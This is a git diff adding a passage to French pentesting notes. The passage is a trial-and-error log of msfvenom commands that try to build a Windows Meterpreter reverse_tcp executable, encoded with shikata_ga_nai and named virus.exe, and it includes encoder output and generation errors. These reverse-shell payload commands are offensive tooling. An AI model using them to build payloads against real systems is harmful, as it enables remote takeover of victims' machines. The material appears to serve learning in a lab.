@@ -930,3 +930,36 @@ Création d'un shellcode:
 ```
 msfvenom –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
 ```
+
+!!! failure "msfvenom demande de spécifier une architecture"
+
+```
+msfvenom --help
+```
+```
+msfvenom -a cmd –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
+```
+
+!!! failure "On doit également spécifier une plateforme"
+
+```
+msfvenom --list platforms
+```
+```
+msfvenom --platform windows -a cmd –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
+```
+```
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai chosen with final size 81
+Payload size: 81 bytes
+Error: The payload could not be generated, check options
+```
+
+!!! failure "Toujours pas la bonne commande"
+    On regarde la [doc officielle](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) pour affiner les options.
+
